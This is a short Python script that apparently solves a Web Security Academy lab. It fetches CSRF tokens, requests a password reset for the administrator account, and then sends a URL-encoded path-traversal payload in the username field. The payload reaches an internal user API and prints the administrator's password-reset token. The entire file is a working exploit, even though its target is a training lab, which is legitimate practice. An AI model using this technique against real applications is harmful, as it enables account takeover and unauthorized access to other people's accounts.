import requests
import sys
import re
import time

def solve():
    host = "https://0ab6003c03e90cd68106c560009d0019.web-security-academy.net"
    if len(sys.argv) > 1:
        host = sys.argv[1]
    
    s = requests.Session()
    
    r = s.get(f"{host}/forgot-password")
    match = re.search(r'name="csrf" value="(\w+)"', r.text)
    if not match:
        return
    csrf = match.group(1)
    
    s.post(f"{host}/forgot-password", data={"csrf": csrf, "username": "administrator"})
    
    time.sleep(1)

    r = s.get(f"{host}/forgot-password")
    match = re.search(r'name="csrf" value="(\w+)"', r.text)
    if not match:
        return
    csrf = match.group(1)
    
    payload = "..%2f..%2f..%2f..%2fapi%2finternal%2fv1%2fusers%2fadministrator%2ffield%2fpasswordResetToken%23"
    data = f"csrf={csrf}&username={payload}"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    r = s.post(f"{host}/forgot-password", data=data, headers=headers)
    
    try:
        json_resp = r.json()
        token = json_resp.get("result")
        if token:
            print(token)
        else:
            print(r.text)
    except:
        print(r.text)

if __name__ == "__main__":
    solve()